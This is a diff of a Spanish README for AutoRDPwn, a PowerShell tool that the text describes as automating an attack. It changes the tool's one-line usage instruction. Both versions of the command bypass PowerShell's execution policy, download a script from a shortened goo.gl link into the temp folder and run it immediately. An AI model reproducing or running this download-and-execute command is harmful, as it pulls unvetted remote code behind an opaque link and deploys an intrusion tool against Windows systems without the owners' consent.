@@ -20,7 +20,7 @@ AutoRDPwn es un script creado en Powershell y diseñado para automatizar el ataq
 # Uso
 Ejecución en una línea:
 
-powershell -ExecutionPolicy Bypass "iwr https://goo.gl/HSkAXP -Outfile %TEMP%\AutoRDPwn.ps1 ; %TEMP%\AutoRDPwn.ps1"
+powershell -ExecutionPolicy Bypass "cd $env:TEMP ; iwr https://goo.gl/HSkAXP -Outfile AutoRDPwn.ps1 ; .\AutoRDPwn.ps1"
 
 La guía detallada de uso se encuentra en los siguientes enlaces: 
 
